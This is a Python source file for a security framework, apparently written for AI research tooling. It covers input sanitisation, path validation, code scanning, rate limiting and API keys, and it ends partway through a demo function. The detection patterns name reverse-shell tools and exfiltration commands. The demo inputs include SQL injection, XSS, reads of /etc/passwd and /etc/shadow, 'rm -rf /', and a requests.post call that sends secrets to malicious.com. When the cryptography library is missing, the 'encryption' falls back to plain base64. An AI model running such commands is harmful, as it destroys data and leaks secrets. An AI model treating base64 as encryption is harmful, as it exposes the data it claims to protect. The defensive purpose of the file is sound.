#!/usr/bin/env python3
"""
Security Framework - Generation 2: MAKE IT ROBUST

Comprehensive security measures, input sanitization, and protection mechanisms for AI Scientist systems.
Implements defense in depth with multiple security layers and threat mitigation strategies.
"""

import asyncio
import base64
import hashlib
import hmac
import json
import logging
import re
import secrets
import time
from concurrent.futures import ThreadPoolExecutor
from contextlib import asynccontextmanager, contextmanager
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Union, Callable
import os
import subprocess
import sys

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn


class ThreatLevel(Enum):
    """Security threat levels."""
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


class SecurityEvent(Enum):
    """Types of security events."""
    AUTHENTICATION_FAILURE = "auth_failure"
    AUTHORIZATION_DENIED = "authz_denied"
    SUSPICIOUS_INPUT = "suspicious_input"
    INJECTION_ATTEMPT = "injection_attempt"
    PATH_TRAVERSAL = "path_traversal"
    RATE_LIMIT_EXCEEDED = "rate_limit_exceeded"
    MALICIOUS_CODE = "malicious_code"
    DATA_EXFILTRATION = "data_exfiltration"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    RESOURCE_ABUSE = "resource_abuse"


@dataclass
class SecurityIncident:
    """Security incident tracking."""
    incident_id: str
    event_type: SecurityEvent
    threat_level: ThreatLevel
    timestamp: datetime
    source_ip: Optional[str] = None
    user_agent: Optional[str] = None
    request_path: Optional[str] = None
    payload: Optional[str] = None
    description: str = ""
    blocked: bool = False
    response_action: str = ""
    
    # Investigation data
    investigation_status: str = "open"  # open, investigating, resolved
    assigned_to: Optional[str] = None
    resolution_notes: Optional[str] = None
    false_positive: bool = False


@dataclass
class UserSession:
    """User session tracking for security."""
    session_id: str
    user_id: str
    created_at: datetime
    last_activity: datetime
    ip_address: str
    user_agent: str
    permissions: Set[str] = field(default_factory=set)
    failed_attempts: int = 0
    is_locked: bool = False
    
    @property
    def is_expired(self) -> bool:
        """Check if session is expired."""
        return datetime.now() - self.last_activity > timedelta(hours=24)
    
    @property
    def is_active(self) -> bool:
        """Check if session is active."""
        return not (self.is_expired or self.is_locked)


class SecurityFramework:
    """
    Generation 2: MAKE IT ROBUST
    Comprehensive security framework with multiple protection layers.
    """
    
    def __init__(self, workspace_dir: str = "security_workspace"):
        self.console = Console()
        self.logger = self._setup_security_logging()
        
        self.workspace_dir = Path(workspace_dir)
        self.workspace_dir.mkdir(exist_ok=True)
        
        # Security configuration
        self.security_config = {
            'max_failed_attempts': 3,
            'lockout_duration': timedelta(minutes=15),
            'session_timeout': timedelta(hours=24),
            'rate_limit_requests': 100,
            'rate_limit_window': timedelta(minutes=1),
            'max_input_length': 10000,
            'allowed_file_extensions': {'.txt', '.json', '.yaml', '.yml', '.py', '.md'},
            'blocked_file_extensions': {'.exe', '.bat', '.sh', '.cmd', '.scr'},
            'enable_path_validation': True,
            'enable_input_sanitization': True,
            'enable_code_scanning': True
        }
        
        # Security state
        self.active_sessions: Dict[str, UserSession] = {}
        self.security_incidents: List[SecurityIncident] = []
        self.rate_limit_tracking: Dict[str, List[datetime]] = {}  # IP -> request timestamps
        self.blocked_ips: Set[str] = set()
        self.api_keys: Dict[str, Dict[str, Any]] = {}  # key_id -> key_data
        
        # Security patterns
        self.injection_patterns = self._initialize_injection_patterns()
        self.malicious_patterns = self._initialize_malicious_patterns()
        self.sensitive_data_patterns = self._initialize_sensitive_patterns()
        
        # Crypto components
        self.encryption_key = self._generate_encryption_key()
        
        # Thread pool for security operations
        self.executor = ThreadPoolExecutor(max_workers=4, thread_name_prefix="security")
        
        # Security metrics
        self.security_metrics = {
            'total_incidents': 0,
            'blocked_requests': 0,
            'failed_authentications': 0,
            'suspicious_activities': 0,
            'false_positives': 0,
            'response_time_avg': 0.0
        }
    
    def _setup_security_logging(self) -> logging.Logger:
        """Setup security-focused logging."""
        
        logger = logging.getLogger(f"{__name__}.SecurityFramework")
        logger.setLevel(logging.INFO)
        
        if not logger.handlers:
            # Security log file handler
            security_log = self.workspace_dir / "security.log"
            file_handler = logging.FileHandler(security_log)
            file_handler.setLevel(logging.INFO)
            
            # Security-specific formatter
            formatter = logging.Formatter(
                '%(asctime)s - SECURITY - %(levelname)s - %(funcName)s - %(message)s'
            )
            file_handler.setFormatter(formatter)
            logger.addHandler(file_handler)
            
            # Console handler for critical security events
            console_handler = logging.StreamHandler()
            console_handler.setLevel(logging.WARNING)
            console_handler.setFormatter(formatter)
            logger.addHandler(console_handler)
        
        return logger
    
    def _generate_encryption_key(self) -> bytes:
        """Generate encryption key for sensitive data."""
        return secrets.token_bytes(32)  # 256-bit key
    
    def _initialize_injection_patterns(self) -> List[re.Pattern]:
        """Initialize patterns for detecting injection attacks."""
        
        patterns = [
            # SQL Injection patterns
            re.compile(r"(\bunion\b.*\bselect\b)|(\bselect\b.*\bfrom\b)|(\bdrop\b.*\btable\b)", re.IGNORECASE),
            re.compile(r"(\binsert\b.*\binto\b)|(\bupdate\b.*\bset\b)|(\bdelete\b.*\bfrom\b)", re.IGNORECASE),
            re.compile(r"(\bexec\b.*\()|(\bexecute\b.*\()|(\bsp_executesql\b)", re.IGNORECASE),
            
            # Command Injection patterns
            re.compile(r"(;|\||&&|\$\(|\`)", re.IGNORECASE),
            re.compile(r"(\bcat\b|\bls\b|\bps\b|\bwhoami\b|\bid\b)\s", re.IGNORECASE),
            re.compile(r"(\\x[0-9a-f]{2})|(%[0-9a-f]{2})", re.IGNORECASE),
            
            # Script Injection patterns
            re.compile(r"<script[^>]*>.*?</script>", re.IGNORECASE | re.DOTALL),
            re.compile(r"javascript:|vbscript:|data:", re.IGNORECASE),
            re.compile(r"on\w+\s*=", re.IGNORECASE),
            
            # Path Traversal patterns
            re.compile(r"(\.\.[\\/])+", re.IGNORECASE),
            re.compile(r"[\\/](etc|proc|sys|windows|system32)[\\/]", re.IGNORECASE),
            
            # Python Code Injection patterns
            re.compile(r"\b(exec|eval|compile|__import__|getattr|setattr)\s*\(", re.IGNORECASE),
            re.compile(r"\b(subprocess|os\.system|os\.popen)\s*\(", re.IGNORECASE)
        ]
        
        return patterns
    
    def _initialize_malicious_patterns(self) -> List[re.Pattern]:
        """Initialize patterns for detecting malicious content."""
        
        patterns = [
            # Reverse shell patterns
            re.compile(r"(nc\s+-l|netcat\s+-l|/bin/sh|/bin/bash)", re.IGNORECASE),
            re.compile(r"(socket\.socket|subprocess\.Popen|pty\.spawn)", re.IGNORECASE),
            
            # Cryptocurrency mining patterns
            re.compile(r"(xmrig|minergate|coinhive|cryptonight)", re.IGNORECASE),
            
            # Data exfiltration patterns
            re.compile(r"(curl\s+.*http|wget\s+.*http|requests\.post)", re.IGNORECASE),
            re.compile(r"(base64\s+.*\||openssl\s+enc)", re.IGNORECASE),
            
            # Privilege escalation patterns
            re.compile(r"(sudo\s+-s|su\s+-|chmod\s+777)", re.IGNORECASE),
            
            # Backdoor patterns
            re.compile(r"(backdoor|rootkit|trojan|keylogger)", re.IGNORECASE)
        ]
        
        return patterns
    
    def _initialize_sensitive_patterns(self) -> List[re.Pattern]:
        """Initialize patterns for detecting sensitive data."""
        
        patterns = [
            # API keys and tokens
            re.compile(r"(api[_-]?key|token|secret)[\"'\s]*[:=][\"'\s]*[a-zA-Z0-9]{20,}", re.IGNORECASE),
            re.compile(r"sk-[a-zA-Z0-9]{48}", re.IGNORECASE),  # OpenAI API keys
            re.compile(r"ghp_[a-zA-Z0-9]{36}", re.IGNORECASE),  # GitHub personal access tokens
            
            # AWS credentials
            re.compile(r"AKIA[0-9A-Z]{16}", re.IGNORECASE),  # AWS access key
            re.compile(r"aws[_-]?secret[_-]?access[_-]?key", re.IGNORECASE),
            
            # Private keys
            re.compile(r"-----BEGIN.*PRIVATE KEY-----", re.IGNORECASE),
            
            # Database connection strings
            re.compile(r"(mongodb|mysql|postgresql)://[^\\s]+", re.IGNORECASE),
            
            # Credit card patterns
            re.compile(r"\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\b"),
            
            # Email addresses (when in sensitive contexts)
            re.compile(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b"),
            
            # Social security numbers
            re.compile(r"\b\d{3}-\d{2}-\d{4}\b"),
        ]
        
        return patterns
    
    def create_secure_session(
        self,
        user_id: str,
        ip_address: str,
        user_agent: str,
        permissions: Optional[Set[str]] = None
    ) -> str:
        """Create a secure user session."""
        
        # Generate secure session ID
        session_id = secrets.token_urlsafe(32)
        
        session = UserSession(
            session_id=session_id,
            user_id=user_id,
            created_at=datetime.now(),
            last_activity=datetime.now(),
            ip_address=ip_address,
            user_agent=user_agent,
            permissions=permissions or set()
        )
        
        self.active_sessions[session_id] = session
        
        self.logger.info(f"Created secure session for user {user_id} from {ip_address}")
        
        return session_id
    
    def validate_session(self, session_id: str, ip_address: str) -> Optional[UserSession]:
        """Validate and update user session."""
        
        if session_id not in self.active_sessions:
            self.logger.warning(f"Invalid session ID attempted from {ip_address}")
            return None
        
        session = self.active_sessions[session_id]
        
        # Check if session is active
        if not session.is_active:
            self.logger.warning(f"Expired/locked session attempted for user {session.user_id}")
            del self.active_sessions[session_id]
            return None
        
        # Validate IP address (optional, depending on security requirements)
        if session.ip_address != ip_address:
            self.logger.warning(f"Session IP mismatch for user {session.user_id}: {session.ip_address} vs {ip_address}")
            # Could choose to invalidate session or just log warning
        
        # Update last activity
        session.last_activity = datetime.now()
        
        return session
    
    def revoke_session(self, session_id: str, reason: str = "manual"):
        """Revoke a user session."""
        
        if session_id in self.active_sessions:
            session = self.active_sessions[session_id]
            self.logger.info(f"Revoked session for user {session.user_id}, reason: {reason}")
            del self.active_sessions[session_id]
    
    def sanitize_input(self, input_data: Any, field_name: str = "input") -> Any:
        """Sanitize user input to prevent security vulnerabilities."""
        
        if input_data is None:
            return None
        
        if isinstance(input_data, str):
            return self._sanitize_string(input_data, field_name)
        elif isinstance(input_data, dict):
            return self._sanitize_dict(input_data, field_name)
        elif isinstance(input_data, list):
            return self._sanitize_list(input_data, field_name)
        else:
            # For other types, convert to string and sanitize
            return self._sanitize_string(str(input_data), field_name)
    
    def _sanitize_string(self, text: str, field_name: str) -> str:
        """Sanitize string input."""
        
        if not self.security_config['enable_input_sanitization']:
            return text
        
        # Check length limit
        max_length = self.security_config['max_input_length']
        if len(text) > max_length:
            self.logger.warning(f"Input too long for field {field_name}: {len(text)} chars")
            self._record_security_incident(
                SecurityEvent.SUSPICIOUS_INPUT,
                ThreatLevel.MEDIUM,
                f"Input length {len(text)} exceeds limit {max_length} for field {field_name}",
                payload=text[:200] + "..." if len(text) > 200 else text
            )
            text = text[:max_length]
        
        # Check for injection patterns
        for pattern in self.injection_patterns:
            if pattern.search(text):
                self.logger.warning(f"Injection pattern detected in field {field_name}")
                self._record_security_incident(
                    SecurityEvent.INJECTION_ATTEMPT,
                    ThreatLevel.HIGH,
                    f"Injection pattern detected in field {field_name}",
                    payload=text[:200] + "..." if len(text) > 200 else text,
                    blocked=True
                )
                # Replace suspicious content
                text = pattern.sub("[FILTERED]", text)
        
        # Check for malicious patterns
        for pattern in self.malicious_patterns:
            if pattern.search(text):
                self.logger.error(f"Malicious content detected in field {field_name}")
                self._record_security_incident(
                    SecurityEvent.MALICIOUS_CODE,
                    ThreatLevel.CRITICAL,
                    f"Malicious content detected in field {field_name}",
                    payload=text[:200] + "..." if len(text) > 200 else text,
                    blocked=True
                )
                text = pattern.sub("[BLOCKED]", text)
        
        # Check for sensitive data
        for pattern in self.sensitive_data_patterns:
            if pattern.search(text):
                self.logger.warning(f"Potential sensitive data in field {field_name}")
                self._record_security_incident(
                    SecurityEvent.DATA_EXFILTRATION,
                    ThreatLevel.HIGH,
                    f"Potential sensitive data detected in field {field_name}",
                    payload="[REDACTED FOR SECURITY]",
                    blocked=True
                )
                text = pattern.sub("[REDACTED]", text)
        
        # Basic HTML encoding for XSS prevention
        text = text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        text = text.replace('"', "&quot;").replace("'", "&#x27;")
        
        return text
    
    def _sanitize_dict(self, data: Dict, field_name: str) -> Dict:
        """Sanitize dictionary input."""
        
        sanitized = {}
        for key, value in data.items():
            # Sanitize key
            safe_key = self._sanitize_string(str(key), f"{field_name}.key")
            
            # Sanitize value
            safe_value = self.sanitize_input(value, f"{field_name}.{safe_key}")
            
            sanitized[safe_key] = safe_value
        
        return sanitized
    
    def _sanitize_list(self, data: List, field_name: str) -> List:
        """Sanitize list input."""
        
        sanitized = []
        for i, item in enumerate(data):
            safe_item = self.sanitize_input(item, f"{field_name}[{i}]")
            sanitized.append(safe_item)
        
        return sanitized
    
    def validate_file_path(self, file_path: str, base_directory: Optional[str] = None) -> bool:
        """Validate file path to prevent path traversal attacks."""
        
        if not self.security_config['enable_path_validation']:
            return True
        
        try:
            path = Path(file_path).resolve()
            
            # Check for path traversal
            if ".." in file_path or path.is_absolute():
                if base_directory:
                    base_path = Path(base_directory).resolve()
                    if not str(path).startswith(str(base_path)):
                        self.logger.warning(f"Path traversal attempt: {file_path}")
                        self._record_security_incident(
                            SecurityEvent.PATH_TRAVERSAL,
                            ThreatLevel.HIGH,
                            f"Path traversal attempt: {file_path}",
                            blocked=True
                        )
                        return False
                else:
                    self.logger.warning(f"Absolute path or traversal in: {file_path}")
                    return False
            
            # Check file extension
            file_extension = path.suffix.lower()
            
            if file_extension in self.security_config['blocked_file_extensions']:
                self.logger.warning(f"Blocked file extension: {file_extension}")
                self._record_security_incident(
                    SecurityEvent.MALICIOUS_CODE,
                    ThreatLevel.HIGH,
                    f"Attempt to access blocked file extension: {file_extension}",
                    blocked=True
                )
                return False
            
            if (self.security_config['allowed_file_extensions'] and 
                file_extension not in self.security_config['allowed_file_extensions']):
                self.logger.warning(f"Non-allowed file extension: {file_extension}")
                return False
            
            return True
            
        except Exception as e:
            self.logger.error(f"Path validation error: {e}")
            return False
    
    def scan_code_content(self, code: str, context: str = "code_input") -> Dict[str, Any]:
        """Scan code content for security vulnerabilities."""
        
        if not self.security_config['enable_code_scanning']:
            return {'safe': True, 'issues': []}
        
        issues = []
        
        # Check for dangerous imports
        dangerous_imports = [
            'os', 'sys', 'subprocess', 'eval', 'exec', 'compile',
            'importlib', '__import__', 'pickle', 'marshal', 'ctypes'
        ]
        
        for dangerous_import in dangerous_imports:
            if re.search(rf'\b(import|from)\s+{dangerous_import}\b', code):
                issues.append({
                    'type': 'dangerous_import',
                    'severity': 'high',
                    'description': f'Potentially dangerous import: {dangerous_import}',
                    'line': None
                })
        
        # Check for dangerous functions
        dangerous_functions = [
            'eval', 'exec', 'compile', 'open', '__import__',
            'getattr', 'setattr', 'hasattr', 'delattr'
        ]
        
        for func in dangerous_functions:
            if re.search(rf'\b{func}\s*\(', code):
                issues.append({
                    'type': 'dangerous_function',
                    'severity': 'high',
                    'description': f'Potentially dangerous function call: {func}',
                    'line': None
                })
        
        # Check for file operations
        file_operations = ['open', 'file', 'read', 'write', 'delete', 'remove']
        for op in file_operations:
            if re.search(rf'\b{op}\s*\(', code):
                issues.append({
                    'type': 'file_operation',
                    'severity': 'medium',
                    'description': f'File operation detected: {op}',
                    'line': None
                })
        
        # Check for network operations
        network_operations = ['socket', 'urllib', 'requests', 'http', 'ftp']
        for op in network_operations:
            if re.search(rf'\b{op}\b', code):
                issues.append({
                    'type': 'network_operation',
                    'severity': 'medium',
                    'description': f'Network operation detected: {op}',
                    'line': None
                })
        
        # Log security issues
        if issues:
            high_severity_count = sum(1 for issue in issues if issue['severity'] == 'high')
            if high_severity_count > 0:
                self.logger.warning(f"Code scan found {high_severity_count} high-severity issues in {context}")
                self._record_security_incident(
                    SecurityEvent.MALICIOUS_CODE,
                    ThreatLevel.HIGH,
                    f"Code scan found {high_severity_count} high-severity security issues in {context}",
                    payload=code[:500] + "..." if len(code) > 500 else code
                )
        
        return {
            'safe': len([i for i in issues if i['severity'] == 'high']) == 0,
            'issues': issues,
            'scan_context': context
        }
    
    def check_rate_limit(self, identifier: str, limit: Optional[int] = None, window: Optional[timedelta] = None) -> bool:
        """Check if request exceeds rate limit."""
        
        if limit is None:
            limit = self.security_config['rate_limit_requests']
        if window is None:
            window = self.security_config['rate_limit_window']
        
        now = datetime.now()
        cutoff_time = now - window
        
        # Initialize tracking for new identifier
        if identifier not in self.rate_limit_tracking:
            self.rate_limit_tracking[identifier] = []
        
        # Remove old entries
        self.rate_limit_tracking[identifier] = [
            timestamp for timestamp in self.rate_limit_tracking[identifier]
            if timestamp > cutoff_time
        ]
        
        # Check current count
        current_count = len(self.rate_limit_tracking[identifier])
        
        if current_count >= limit:
            self.logger.warning(f"Rate limit exceeded for {identifier}: {current_count} requests")
            self._record_security_incident(
                SecurityEvent.RATE_LIMIT_EXCEEDED,
                ThreatLevel.MEDIUM,
                f"Rate limit exceeded: {current_count} requests from {identifier}",
                source_ip=identifier if self._is_ip_address(identifier) else None
            )
            return False
        
        # Add current request
        self.rate_limit_tracking[identifier].append(now)
        
        return True
    
    def _is_ip_address(self, address: str) -> bool:
        """Check if string is a valid IP address."""
        try:
            import ipaddress
            ipaddress.ip_address(address)
            return True
        except ValueError:
            return False
    
    def block_ip(self, ip_address: str, reason: str = "security_violation"):
        """Block an IP address."""
        
        self.blocked_ips.add(ip_address)
        
        self.logger.warning(f"Blocked IP address {ip_address}: {reason}")
        self._record_security_incident(
            SecurityEvent.RESOURCE_ABUSE,
            ThreatLevel.HIGH,
            f"IP address blocked: {reason}",
            source_ip=ip_address,
            blocked=True,
            response_action=f"IP blocked: {reason}"
        )
    
    def is_ip_blocked(self, ip_address: str) -> bool:
        """Check if IP address is blocked."""
        return ip_address in self.blocked_ips
    
    def generate_api_key(self, user_id: str, permissions: Set[str], expires_at: Optional[datetime] = None) -> str:
        """Generate secure API key."""
        
        # Generate key components
        key_id = secrets.token_urlsafe(16)
        key_secret = secrets.token_urlsafe(32)
        
        # Create API key with metadata
        api_key_data = {
            'user_id': user_id,
            'permissions': list(permissions),
            'created_at': datetime.now().isoformat(),
            'expires_at': expires_at.isoformat() if expires_at else None,
            'active': True,
            'usage_count': 0,
            'last_used': None
        }
        
        # Store API key data (in production, this would be encrypted)
        self.api_keys[key_id] = api_key_data
        
        # Return the API key (format: key_id.key_secret)
        api_key = f"{key_id}.{key_secret}"
        
        self.logger.info(f"Generated API key for user {user_id}")
        
        return api_key
    
    def validate_api_key(self, api_key: str) -> Optional[Dict[str, Any]]:
        """Validate API key and return associated data."""
        
        try:
            key_id, key_secret = api_key.split('.', 1)
            
            if key_id not in self.api_keys:
                self.logger.warning("Invalid API key attempted")
                self._record_security_incident(
                    SecurityEvent.AUTHENTICATION_FAILURE,
                    ThreatLevel.MEDIUM,
                    "Invalid API key used",
                    blocked=True
                )
                return None
            
            key_data = self.api_keys[key_id]
            
            # Check if key is active
            if not key_data['active']:
                self.logger.warning("Inactive API key attempted")
                return None
            
            # Check expiration
            if key_data['expires_at']:
                expires_at = datetime.fromisoformat(key_data['expires_at'])
                if datetime.now() > expires_at:
                    self.logger.warning("Expired API key attempted")
                    key_data['active'] = False
                    return None
            
            # Update usage
            key_data['usage_count'] += 1
            key_data['last_used'] = datetime.now().isoformat()
            
            return key_data
            
        except ValueError:
            self.logger.warning("Malformed API key attempted")
            self._record_security_incident(
                SecurityEvent.AUTHENTICATION_FAILURE,
                ThreatLevel.MEDIUM,
                "Malformed API key format",
                payload=api_key[:20] + "..." if len(api_key) > 20 else api_key
            )
            return None
    
    def revoke_api_key(self, api_key: str, reason: str = "manual"):
        """Revoke an API key."""
        
        try:
            key_id, _ = api_key.split('.', 1)
            
            if key_id in self.api_keys:
                self.api_keys[key_id]['active'] = False
                self.logger.info(f"Revoked API key {key_id}: {reason}")
                
        except ValueError:
            self.logger.error("Invalid API key format for revocation")
    
    def encrypt_sensitive_data(self, data: str) -> str:
        """Encrypt sensitive data using AES encryption."""
        
        try:
            from cryptography.fernet import Fernet
            
            # Generate key-derived encryption key
            key = base64.urlsafe_b64encode(self.encryption_key[:32])
            cipher_suite = Fernet(key)
            
            # Encrypt the data
            encrypted_data = cipher_suite.encrypt(data.encode('utf-8'))
            
            return base64.b64encode(encrypted_data).decode('utf-8')
            
        except ImportError:
            self.logger.warning("Cryptography library not available, using base64 encoding")
            return base64.b64encode(data.encode('utf-8')).decode('utf-8')
    
    def decrypt_sensitive_data(self, encrypted_data: str) -> str:
        """Decrypt sensitive data."""
        
        try:
            from cryptography.fernet import Fernet
            
            # Generate key-derived encryption key
            key = base64.urlsafe_b64encode(self.encryption_key[:32])
            cipher_suite = Fernet(key)
            
            # Decrypt the data
            encrypted_bytes = base64.b64decode(encrypted_data.encode('utf-8'))
            decrypted_data = cipher_suite.decrypt(encrypted_bytes)
            
            return decrypted_data.decode('utf-8')
            
        except ImportError:
            self.logger.warning("Cryptography library not available, using base64 decoding")
            return base64.b64decode(encrypted_data.encode('utf-8')).decode('utf-8')
    
    def _record_security_incident(
        self,
        event_type: SecurityEvent,
        threat_level: ThreatLevel,
        description: str,
        source_ip: Optional[str] = None,
        user_agent: Optional[str] = None,
        request_path: Optional[str] = None,
        payload: Optional[str] = None,
        blocked: bool = False,
        response_action: str = ""
    ):
        """Record a security incident."""
        
        incident = SecurityIncident(
            incident_id=f"sec_{int(time.time())}_{secrets.randbelow(10000):04d}",
            event_type=event_type,
            threat_level=threat_level,
            timestamp=datetime.now(),
            source_ip=source_ip,
            user_agent=user_agent,
            request_path=request_path,
            payload=payload,
            description=description,
            blocked=blocked,
            response_action=response_action
        )
        
        self.security_incidents.append(incident)
        
        # Update metrics
        self.security_metrics['total_incidents'] += 1
        if blocked:
            self.security_metrics['blocked_requests'] += 1
        if event_type == SecurityEvent.AUTHENTICATION_FAILURE:
            self.security_metrics['failed_authentications'] += 1
        
        # Log incident
        log_level = {
            ThreatLevel.LOW: logging.INFO,
            ThreatLevel.MEDIUM: logging.WARNING,
            ThreatLevel.HIGH: logging.ERROR,
            ThreatLevel.CRITICAL: logging.CRITICAL
        }.get(threat_level, logging.INFO)
        
        self.logger.log(log_level, f"Security incident {incident.incident_id}: {description}")
        
        # Auto-block for critical threats
        if threat_level == ThreatLevel.CRITICAL and source_ip and not blocked:
            self.block_ip(source_ip, f"Critical security threat: {event_type.value}")
    
    def get_security_summary(self) -> Dict[str, Any]:
        """Get comprehensive security summary."""
        
        recent_window = timedelta(hours=24)
        current_time = datetime.now()
        
        recent_incidents = [
            incident for incident in self.security_incidents
            if current_time - incident.timestamp < recent_window
        ]
        
        # Incident breakdown by type
        incident_types = {}
        threat_levels = {}
        
        for incident in recent_incidents:
            incident_types[incident.event_type.value] = incident_types.get(incident.event_type.value, 0) + 1
            threat_levels[incident.threat_level.value] = threat_levels.get(incident.threat_level.value, 0) + 1
        
        return {
            'timestamp': datetime.now().isoformat(),
            'active_sessions': len(self.active_sessions),
            'blocked_ips': len(self.blocked_ips),
            'active_api_keys': len([k for k in self.api_keys.values() if k['active']]),
            'recent_incidents_24h': len(recent_incidents),
            'incident_types': incident_types,
            'threat_levels': threat_levels,
            'security_metrics': self.security_metrics,
            'security_config': {
                k: v for k, v in self.security_config.items() 
                if not isinstance(v, (set, timedelta))
            }
        }
    
    def create_security_dashboard(self) -> Table:
        """Create security monitoring dashboard."""
        
        table = Table(title="🛡️ Security Framework Dashboard")
        
        table.add_column("Component", style="cyan")
        table.add_column("Status", style="bold")
        table.add_column("Count", style="green")
        table.add_column("Details", style="dim")
        
        # Active sessions
        table.add_row(
            "Active Sessions",
            "[green]✅ ACTIVE[/green]" if self.active_sessions else "[yellow]⚠️ NONE[/yellow]",
            str(len(self.active_sessions)),
            f"{len([s for s in self.active_sessions.values() if s.is_active])} valid"
        )
        
        # Blocked IPs
        blocked_status = "[red]🚫 BLOCKED[/red]" if self.blocked_ips else "[green]✅ NONE[/green]"
        table.add_row(
            "Blocked IPs",
            blocked_status,
            str(len(self.blocked_ips)),
            "IPs blocked for security violations"
        )
        
        # API Keys
        active_keys = len([k for k in self.api_keys.values() if k['active']])
        table.add_row(
            "API Keys",
            "[green]✅ ACTIVE[/green]" if active_keys > 0 else "[yellow]⚠️ NONE[/yellow]",
            f"{active_keys}/{len(self.api_keys)}",
            "Active/Total API keys"
        )
        
        # Recent incidents
        recent_count = len([
            i for i in self.security_incidents
            if datetime.now() - i.timestamp < timedelta(hours=24)
        ])
        
        if recent_count == 0:
            incident_status = "[green]✅ CLEAN[/green]"
        elif recent_count < 10:
            incident_status = "[yellow]⚠️ MODERATE[/yellow]"
        else:
            incident_status = "[red]🚨 HIGH[/red]"
        
        table.add_row(
            "Security Incidents (24h)",
            incident_status,
            str(recent_count),
            "Incidents in last 24 hours"
        )
        
        # Security features
        enabled_features = sum([
            self.security_config['enable_input_sanitization'],
            self.security_config['enable_path_validation'],
            self.security_config['enable_code_scanning']
        ])
        
        table.add_row(
            "Security Features",
            "[green]✅ ENABLED[/green]" if enabled_features == 3 else f"[yellow]⚠️ PARTIAL[/yellow]",
            f"{enabled_features}/3",
            "Security features enabled"
        )
        
        return table


# Security decorators and context managers
def secure_operation(
    required_permissions: Set[str],
    security_framework: SecurityFramework,
    check_rate_limit: bool = True
):
    """Decorator for securing operations with permission checks."""
    
    def decorator(func):
        async def wrapper(*args, **kwargs):
            # Extract session info (this would come from request context in real implementation)
            session_id = kwargs.get('session_id')
            ip_address = kwargs.get('ip_address', '127.0.0.1')
            
            if not session_id:
                raise PermissionError("No session provided")
            
            # Validate session
            session = security_framework.validate_session(session_id, ip_address)
            if not session:
                raise PermissionError("Invalid or expired session")
            
            # Check permissions
            if not required_permissions.issubset(session.permissions):
                missing_perms = required_permissions - session.permissions
                security_framework.logger.warning(
                    f"Permission denied for user {session.user_id}: missing {missing_perms}"
                )
                security_framework._record_security_incident(
                    SecurityEvent.AUTHORIZATION_DENIED,
                    ThreatLevel.MEDIUM,
                    f"User {session.user_id} attempted operation without required permissions: {missing_perms}"
                )
                raise PermissionError(f"Missing required permissions: {missing_perms}")
            
            # Check rate limit
            if check_rate_limit:
                if not security_framework.check_rate_limit(ip_address):
                    raise PermissionError("Rate limit exceeded")
            
            # Execute function
            return await func(*args, **kwargs)
        
        return wrapper
    return decorator


@asynccontextmanager
async def security_context(security_framework: SecurityFramework, operation: str):
    """Async context manager for security operations."""
    
    start_time = time.time()
    
    try:
        yield
        
        # Record successful operation
        execution_time = time.time() - start_time
        security_framework.security_metrics['response_time_avg'] = (
            security_framework.security_metrics['response_time_avg'] + execution_time
        ) / 2
        
    except Exception as e:
        # Record security-related exceptions
        if isinstance(e, PermissionError):
            security_framework._record_security_incident(
                SecurityEvent.AUTHORIZATION_DENIED,
                ThreatLevel.MEDIUM,
                f"Security exception in {operation}: {str(e)}"
            )
        
        raise


# Demo and testing functions
async def demo_security_framework():
    """Demonstrate the security framework capabilities."""
    
    console = Console()
    console.print("[bold blue]🛡️ Security Framework - Generation 2 Demo[/bold blue]")
    
    # Initialize security framework
    security = SecurityFramework()
    
    console.print("\n[yellow]Testing security features...[/yellow]")
    
    # Test 1: Create secure session
    session_id = security.create_secure_session(
        user_id="demo_user",
        ip_address="192.168.1.100",
        user_agent="Mozilla/5.0 Demo Browser",
        permissions={'read', 'write', 'execute'}
    )
    console.print(f"[green]✅ Created secure session: {session_id[:20]}...[/green]")
    
    # Test 2: Input sanitization
    malicious_inputs = [
        "'; DROP TABLE users; --",
        "<script>alert('XSS')</script>",
        "../../etc/passwd",
        "eval('malicious_code()')",
        "api_key=sk-abcdefghijklmnopqrstuvwxyz123456789"
    ]
    
    console.print("\n[cyan]🧹 Testing input sanitization:[/cyan]")
    for i, malicious_input in enumerate(malicious_inputs):
        sanitized = security.sanitize_input(malicious_input, f"test_field_{i}")
        console.print(f"  • Original: {malicious_input[:50]}...")
        console.print(f"  • Sanitized: {sanitized[:50]}...")
    
    # Test 3: File path validation
    console.print("\n[cyan]📁 Testing file path validation:[/cyan]")
    test_paths = [
        "normal_file.txt",
        "../../../etc/passwd",
        "/etc/shadow",
        "data/safe_file.json",
        "script.exe"
    ]
    
    for path in test_paths:
        is_valid = security.validate_file_path(path, "data")
        status = "[green]✅ SAFE[/green]" if is_valid else "[red]🚫 BLOCKED[/red]"
        console.print(f"  • {path}: {status}")
    
    # Test 4: Code scanning
    console.print("\n[cyan]🔍 Testing code security scanning:[/cyan]")
    test_codes = [
        "print('Hello World')",
        "import os; os.system('rm -rf /')",
        "eval(user_input)",
        "requests.post('http://malicious.com', data=secrets)"
    ]
    
    for code in test_codes:
        scan_result = security.scan_code_content(code)
        safety_status = "[green]✅ SAFE[/green]" if scan_result['safe'] else "[red]🚨 UNSAFE[/red]"
        issues_count = len(scan_result['issues'])
        console.print(f"  • Code scan: {safety_status} ({issues_count} issues)")
    
    # Test 5: Rate limiting
    console.print("\n[cyan]⏱️ Testing rate limiting:[/cyan]")
    test_ip = "192.168.1.200"
    
    for i in range(5):
        allowed = security.check_rate_limit(test_ip, limit=3, window=timedelta(minutes=1))
        status = "[green]✅ ALLOWED[/green]" if allowed else "[red]🚫 BLOCKED[/red]"
        console.print(f"  • Request {i+1}: {status}")
    
    # Test 6: API key generation and validation
    console.print("\n[cyan]🔑 Testing API key management:[/cyan]")
    api_key = security.generate_api_key(
        user_id="api_user",
        permissions={'api_read', 'api_write'}
    )
    console.print(f"[green]✅ Generated API key: {api_key[:30]}...[/green]")
    
    # Validate the API key
    key_data = security.validate_api_key(api_key)
    if key_data:
        console.print(f"[green]✅ API key validation successful[/green]")
    
    # Show security dashboard
